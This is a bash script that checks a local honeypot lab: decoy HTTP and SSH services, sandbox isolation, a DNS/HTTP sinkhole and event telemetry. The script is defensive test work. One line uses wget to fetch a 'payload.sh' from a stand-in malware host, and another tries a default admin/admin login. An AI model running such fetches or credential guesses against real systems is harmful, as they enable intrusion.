#!/usr/bin/env bash
# Prove Scope A: surfaces on localhost, events in the log, sandbox isolated, sinkhole works.
set -u

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
FAILS=0

ok() { printf '  OK    %s\n' "$*"; }
bad() { printf '  FAIL  %s\n' "$*"; FAILS=$((FAILS + 1)); }

echo "== health =="
if curl -sf --max-time 3 http://127.0.0.1:18088/health >/dev/null; then
  ok "logger on 127.0.0.1:18088"
else
  bad "logger not healthy"
fi
if curl -sf --max-time 3 http://127.0.0.1:19000/health >/dev/null; then
  ok "decision on 127.0.0.1:19000"
else
  bad "decision not healthy"
fi

echo "== surfaces (localhost only) =="
HTTP_BODY="$(curl -sf --max-time 3 http://127.0.0.1:8080/ || true)"
if printf '%s' "$HTTP_BODY" | grep -q NexusCorp; then
  ok "HTTP portal on 127.0.0.1:8080"
else
  bad "HTTP portal did not respond"
fi
LOGIN="$(curl -s --max-time 3 -o /dev/null -w '%{http_code}' -X POST http://127.0.0.1:8080/login -d 'username=admin&password=admin')"
if [ "$LOGIN" = "401" ]; then
  ok "HTTP login closed (401)"
else
  bad "HTTP login expected 401, got ${LOGIN:-none}"
fi

BANNER="$(python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 2222), timeout=3)
s.sendall(b"SSH-2.0-OpenSSH_9.8-labprobe\r\n")
data = s.recv(256)
s.close()
print(data.decode("latin1", errors="replace").strip())
PY
)"
if printf '%s' "$BANNER" | grep -q 'SSH-2.0-OpenSSH'; then
  ok "SSH banner on 127.0.0.1:2222 (${BANNER})"
else
  bad "SSH banner missing"
fi

echo "== isolation (sandbox must not reach mgmt or the internet) =="
if podman exec cs-sandbox wget -q -T 3 -O- http://10.200.1.10:8088/health >/dev/null 2>&1; then
  bad "sandbox reached logger on mgmt — containment broken"
else
  ok "sandbox cannot reach logger (10.200.1.10)"
fi
if podman exec cs-sandbox wget -q -T 3 -O- http://1.1.1.1/ >/dev/null 2>&1; then
  bad "sandbox reached 1.1.1.1 — internal network is leaking"
else
  ok "sandbox cannot reach 1.1.1.1"
fi

echo "== sinkhole stage 0 =="
RESOLVE="$(podman exec cs-sandbox nslookup malware.example 10.200.3.2 2>/dev/null | tr '\n' ' ' || true)"
if printf '%s' "$RESOLVE" | grep -q '10.200.3.2'; then
  ok "DNS sinkhole returns 10.200.3.2"
else
  bad "DNS sinkhole did not return 10.200.3.2 (${RESOLVE})"
fi
PAYLOAD="$(podman exec cs-sandbox wget -q -T 3 -O- http://malware.example/payload.sh 2>/dev/null || true)"
if printf '%s' "$PAYLOAD" | grep -q sinkholed; then
  ok "HTTP sinkhole served a neutered payload"
else
  bad "HTTP sinkhole fetch failed"
fi

echo "== telemetry =="
TAIL="$(curl -sf --max-time 3 'http://127.0.0.1:18088/v1/tail?n=50' || true)"
python3 - "$TAIL" <<'PY' || true
import json, sys
raw = sys.argv[1] if len(sys.argv) > 1 else ""
try:
    data = json.loads(raw)
except Exception:
    sys.exit(2)
datasets = {e.get("event", {}).get("dataset") for e in data.get("lines", [])}
needed = {
    "cybersnare.ssh.banner",
    "cybersnare.http.request",
    "cybersnare.sinkhole.dns",
    "cybersnare.sinkhole.http",
}
missing = sorted(needed - datasets)
open("/tmp/cs-verify-missing", "w").write("\n".join(missing))
sys.exit(1 if missing else 0)
PY
MISSING_RC=$?
if [ "$MISSING_RC" -eq 0 ]; then
  ok "JSONL has SSH, HTTP, DNS and HTTP-sinkhole events"
elif [ "$MISSING_RC" -eq 2 ]; then
  bad "could not read event tail"
else
  miss="$(cat /tmp/cs-verify-missing 2>/dev/null | tr '\n' ' ')"
  bad "missing datasets: ${miss}"
fi

if curl -sf --max-time 3 http://127.0.0.1:19000/v1/manifest | grep -q 'p0-static-v1'; then
  ok "decision plane still on P0 static manifest"
else
  bad "P0 manifest not published"
fi

echo
if [ "$FAILS" -eq 0 ]; then
  echo "Scope A lab is up."
  exit 0
fi
echo "$FAILS check(s) failed."
exit 1
